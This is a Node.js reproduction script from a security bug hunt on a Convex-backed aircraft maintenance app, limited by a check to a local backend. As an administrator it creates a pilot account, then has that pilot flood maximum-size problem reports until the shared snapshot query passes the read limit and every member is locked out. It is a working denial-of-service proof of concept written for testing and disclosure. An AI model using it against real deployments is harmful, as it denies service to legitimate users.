// Bug-hunt 2026-11-10, sec SE-13: a pilot files maximum-size problem reports
// until the program's snapshot query passes the backend's read limit, which
// locks every member out of the program. LOCAL Convex backend only; it leaves
// that local program unusable.
// Run: cd <checkout> && node --input-type=module < repro/sec/live-snapshot-lockout.mjs
import { readFile } from "node:fs/promises";
import { randomBytes, randomUUID } from "node:crypto";
import { ConvexHttpClient } from "convex/browser";
import { anyApi as api } from "convex/server";
const env = await readFile(".env.local", "utf8");
const url = env.match(/^VITE_CONVEX_URL=(.*)$/m)[1].trim();
if (!/^http:\/\/127\.0\.0\.1:/.test(url)) throw new Error("local only");
const adminAccount = JSON.parse(await readFile(".env.local-admin.json", "utf8"));
const pw = () => randomBytes(18).toString("base64url") + "aA1!";
const signIn = (c, email, password) => c.action(api.auth.signIn, { provider: "password", params: { flow: "signIn", email, password } });
const admin = new ConvexHttpClient(url);
admin.setAuth((await signIn(admin, adminAccount.email, adminAccount.password)).tokens.token);
const snap = await admin.query(api.operations.snapshot, {});
const aircraft = snap.aircraft[0];
const program = aircraft.programUuid;
const email = "lockout-" + randomBytes(4).toString("hex") + "@example.test";
const password = pw();
const id = await admin.action(api.admin.createUser, { email, name: "Lockout pilot", password });
const groupId = await admin.mutation(api.admin.saveGroup, { programUuid: program, name: "Lockout pilots " + randomBytes(2).toString("hex"), aircraftIds: [aircraft.uuid], permissions: ["read", "flight", "discrepancy"] });
await admin.mutation(api.admin.updateUser, { id, active: true, isAdmin: false, groupIds: [groupId] });
const pilot = new ConvexHttpClient(url);
pilot.setAuth((await signIn(pilot, email, password)).tokens.token);
const me = (await pilot.query(api.operations.snapshot, {})).user.id;
// 5,000 characters is the form's limit; each of these is 3 bytes in UTF-8.
const description = "漢".repeat(5000);
const report = () => pilot.mutation(api.operations.submit, { operation: { programUuid: program, kind: "discrepancy", uuid: randomUUID(), authorId: me, aircraftUuid: aircraft.uuid, description } });
const started = Date.now();
let sent = 0, firstSubmitError = "";
const MAX = Number(process.env.MAX_REPORTS ?? 1600), BATCH = 8;
while (sent < MAX) {
  const results = await Promise.allSettled(Array.from({ length: BATCH }, report));
  sent += results.filter((r) => r.status === "fulfilled").length;
  const failed = results.find((r) => r.status === "rejected");
  if (failed && !firstSubmitError) { firstSubmitError = String(failed.reason?.message).split("\n").slice(0, 2).join(" ").slice(0, 200); console.log(`submit first refused after ${sent} reports: ${firstSubmitError}`); }
  if (sent % 80 < BATCH || failed) {
    const check = async (c) => { try { const s = await c.query(api.operations.snapshot, {}); return `ok (${s.discrepancies.length} reports)`; } catch (e) { return "FAILS: " + String(e.message).split("\n").slice(0, 2).join(" ").slice(0, 170); } };
    const a = await check(admin);
    console.log(`${String(sent).padStart(5)} reports, ${Math.round((Date.now() - started) / 1000)} s: administrator snapshot ${a}`);
    if (a.startsWith("FAILS")) { console.log("pilot snapshot " + (await check(pilot))); break; }
    if (failed) break;
  }
}
console.log(JSON.stringify({ reportsSent: sent, seconds: Math.round((Date.now() - started) / 1000), bytesPerReport: Buffer.byteLength(description) }));
